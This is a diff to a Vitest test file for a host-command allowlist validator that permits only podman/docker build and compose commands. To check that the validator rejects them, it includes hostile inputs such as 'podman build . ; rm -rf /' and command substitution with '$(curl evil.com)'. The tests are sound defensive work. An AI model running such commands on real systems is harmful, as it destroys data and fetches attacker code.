@@ -1,5 +1,5 @@
 import { describe, expect, it } from 'vitest';
-import { wouldKillHostProcess } from './index.js';
+import { isAllowedHostCommand, wouldKillHostProcess } from './index.js';
 
 describe('wouldKillHostProcess', () => {
   it('blocks systemctl restart of the nanoclaw unit', () => {
@@ -30,11 +30,59 @@ describe('wouldKillHostProcess', () => {
     expect(wouldKillHostProcess('systemctl --user status cortex-nanoclaw.service')).toBe(false);
     expect(wouldKillHostProcess('systemctl --user list-units --type=service | grep nano')).toBe(false);
   });
+});
 
-  it('allows benign commands that mention nanoclaw in unrelated contexts', () => {
-    expect(wouldKillHostProcess('ls /var/home/vmaz/dev/nanoclaw')).toBe(false);
-    expect(wouldKillHostProcess('cd nanoclaw && git pull')).toBe(false);
-    expect(wouldKillHostProcess('./container/build.sh')).toBe(false);
-    expect(wouldKillHostProcess('docker ps | grep nanoclaw')).toBe(false);
+describe('isAllowedHostCommand', () => {
+  it('allows podman/docker build invocations', () => {
+    expect(isAllowedHostCommand('podman build .')).toBe(true);
+    expect(isAllowedHostCommand('docker build .')).toBe(true);
+    expect(isAllowedHostCommand('podman build -t foo:latest .')).toBe(true);
+    expect(isAllowedHostCommand('docker build -f Dockerfile.prod -t app .')).toBe(true);
+  });
+
+  it('allows podman/docker compose build and run', () => {
+    expect(isAllowedHostCommand('podman compose build')).toBe(true);
+    expect(isAllowedHostCommand('docker compose build admin-ui')).toBe(true);
+    expect(isAllowedHostCommand('podman compose run --rm migrate')).toBe(true);
+    expect(isAllowedHostCommand('docker compose run service /bin/sh -c "echo hi"')).toBe(true);
+  });
+
+  it('allows a leading `cd <abs-path> &&` prefix', () => {
+    expect(isAllowedHostCommand('cd /var/home/vmaz/dev/automagica-platform && podman compose build admin-ui')).toBe(
+      true,
+    );
+    expect(isAllowedHostCommand('cd /tmp && podman build .')).toBe(true);
+  });
+
+  it('rejects non-build commands', () => {
+    expect(isAllowedHostCommand('make build')).toBe(false);
+    expect(isAllowedHostCommand('./container/build.sh')).toBe(false);
+    expect(isAllowedHostCommand('ls /tmp')).toBe(false);
+    expect(isAllowedHostCommand('podman ps')).toBe(false);
+    expect(isAllowedHostCommand('docker run -it alpine sh')).toBe(false);
+    expect(isAllowedHostCommand('podman pull alpine')).toBe(false);
+  });
+
+  it('rejects shell-chained subcommands', () => {
+    expect(isAllowedHostCommand('podman build . ; rm -rf /')).toBe(false);
+    expect(isAllowedHostCommand('podman build . && rm -rf /')).toBe(false);
+    expect(isAllowedHostCommand('podman build . || echo failed')).toBe(false);
+    expect(isAllowedHostCommand('podman build . | tee log.txt')).toBe(false);
+    expect(isAllowedHostCommand('cd /tmp && podman build . && malicious')).toBe(false);
+    expect(isAllowedHostCommand('cd /tmp; podman build .')).toBe(false);
+  });
+
+  it('rejects command substitution', () => {
+    expect(isAllowedHostCommand('podman build $(curl evil.com)')).toBe(false);
+    expect(isAllowedHostCommand('podman build `echo .`')).toBe(false);
+  });
+
+  it('rejects environment-variable prefixes', () => {
+    expect(isAllowedHostCommand('FOO=bar podman build .')).toBe(false);
+  });
+
+  it('rejects nested cd or cd to a relative path', () => {
+    expect(isAllowedHostCommand('cd src && podman build .')).toBe(false);
+    expect(isAllowedHostCommand('cd /a && cd /b && podman build .')).toBe(false);
   });
 });
